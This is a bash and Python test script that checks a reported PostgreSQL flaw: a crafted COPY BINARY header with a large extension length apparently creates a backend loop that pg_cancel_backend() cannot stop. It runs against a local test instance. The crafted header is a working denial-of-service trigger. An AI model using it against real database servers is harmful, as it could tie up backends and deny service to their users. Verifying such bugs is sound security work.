#!/bin/bash
# N-1: COPY BINARY Header Extension -- Uninterruptible DoS Loop
# Severity: Medium
# File: src/backend/commands/copyfromparse.c, lines 219-232
#
# This test verifies that a COPY BINARY with a huge extension_length
# creates an uninterruptible loop that cannot be cancelled.
#
# The test:
# 1. Starts a COPY FROM STDIN (FORMAT binary) in background
# 2. Sends a valid binary header with extension_length = large number
# 3. Slowly feeds bytes
# 4. Tries pg_cancel_backend() from another session
# 5. Verifies the cancel has NO effect (the loop has no CHECK_FOR_INTERRUPTS)
# 6. Uses pg_terminate_backend() to clean up

set -e

PSQL="/tmp/pg-test/bin/psql -p 15432 -h /tmp"
DB="pgtest"

echo "=== N-1: COPY BINARY uninterruptible DoS test ==="

# Create test table
$PSQL -d $DB -c "DROP TABLE IF EXISTS n1_test; CREATE TABLE n1_test (id int);" 2>&1

# Python script to send a crafted binary COPY stream
cat > /tmp/n1_copy_test.py << 'PYEOF'
import socket
import struct
import time
import subprocess
import sys
import os

PSQL = "/tmp/pg-test/bin/psql"
DB = "pgtest"

# Start a psql process in COPY mode
# We'll use a pipe to feed data to psql's stdin
proc = subprocess.Popen(
    [PSQL, "-p", "15432", "-h", "/tmp", "-d", DB, "-c",
     "COPY n1_test FROM STDIN WITH (FORMAT binary)"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Build the COPY BINARY header:
# 11-byte signature: PGCOPY\n\377\r\n\0
header = b'PGCOPY\n\xff\r\n\x00'
# 4-byte flags (0)
header += struct.pack('>I', 0)
# 4-byte extension length -- set to a large value (10000)
# This is enough to test; INT_MAX would take forever
EXT_LEN = 10000
header += struct.pack('>i', EXT_LEN)

# Send the header
proc.stdin.write(header)
proc.stdin.flush()

print(f"Sent COPY BINARY header with extension_length={EXT_LEN}")
print("Feeding extension bytes slowly...")

# Get the backend PID for this connection
# We need another connection to find and try to cancel it
pid_proc = subprocess.run(
    [PSQL, "-p", "15432", "-h", "/tmp", "-d", DB, "-t", "-A", "-c",
     "SELECT pid FROM pg_stat_activity WHERE query LIKE '%COPY n1_test%' AND pid != pg_backend_pid() LIMIT 1"],
    capture_output=True, text=True
)
backend_pid = pid_proc.stdout.strip()

if not backend_pid:
    # Feed a few bytes first, then retry
    for _ in range(100):
        proc.stdin.write(b'\x00')
        proc.stdin.flush()
    time.sleep(0.5)
    pid_proc = subprocess.run(
        [PSQL, "-p", "15432", "-h", "/tmp", "-d", DB, "-t", "-A", "-c",
         "SELECT pid FROM pg_stat_activity WHERE query LIKE '%COPY n1_test%' AND pid != pg_backend_pid() LIMIT 1"],
        capture_output=True, text=True
    )
    backend_pid = pid_proc.stdout.strip()

if not backend_pid:
    print("WARNING: Could not find backend PID. Sending cancel anyway.")
    # Feed remaining bytes and close
    remaining = EXT_LEN - 100
    proc.stdin.write(b'\x00' * remaining)
    proc.stdin.flush()
    proc.stdin.close()
    out, err = proc.communicate(timeout=10)
    print(f"COPY completed. stdout={out.decode()}, stderr={err.decode()}")
    sys.exit(1)

print(f"Found backend PID: {backend_pid}")

# Feed 500 bytes (leaving many remaining)
for i in range(500):
    proc.stdin.write(b'\x00')
    proc.stdin.flush()
print("Fed 500 extension bytes")

# Now try to cancel the backend
print("Attempting pg_cancel_backend()...")
cancel_result = subprocess.run(
    [PSQL, "-p", "15432", "-h", "/tmp", "-d", DB, "-t", "-A", "-c",
     f"SELECT pg_cancel_backend({backend_pid})"],
    capture_output=True, text=True
)
print(f"Cancel result: {cancel_result.stdout.strip()}")

# Wait a moment, then check if the backend is still running
time.sleep(1)

check_result = subprocess.run(
    [PSQL, "-p", "15432", "-h", "/tmp", "-d", DB, "-t", "-A", "-c",
     f"SELECT count(*) FROM pg_stat_activity WHERE pid = {backend_pid}"],
    capture_output=True, text=True
)
still_running = check_result.stdout.strip()

if still_running == "1":
    print(f"N-1 RESULT: *** VERIFIED *** - Backend {backend_pid} STILL RUNNING after pg_cancel_backend()")
    print("The COPY BINARY header loop is uninterruptible as claimed.")

    # Clean up: terminate the backend
    subprocess.run(
        [PSQL, "-p", "15432", "-h", "/tmp", "-d", DB, "-c",
         f"SELECT pg_terminate_backend({backend_pid})"],
        capture_output=True, text=True
    )
    proc.stdin.close()
    proc.wait(timeout=5)
else:
    print(f"N-1 RESULT: NOT VERIFIED - Backend was cancelled successfully")
    # Feed remaining bytes to let it finish
    try:
        remaining = EXT_LEN - 500
        proc.stdin.write(b'\x00' * remaining)
        proc.stdin.close()
    except:
        pass
    proc.wait(timeout=5)

PYEOF

# Run the Python test
python3 /tmp/n1_copy_test.py 2>&1
RESULT=$?

# Cleanup
$PSQL -d $DB -c "DROP TABLE IF EXISTS n1_test;" 2>&1
rm -f /tmp/n1_copy_test.py

echo "=== N-1 test complete ==="
exit $RESULT
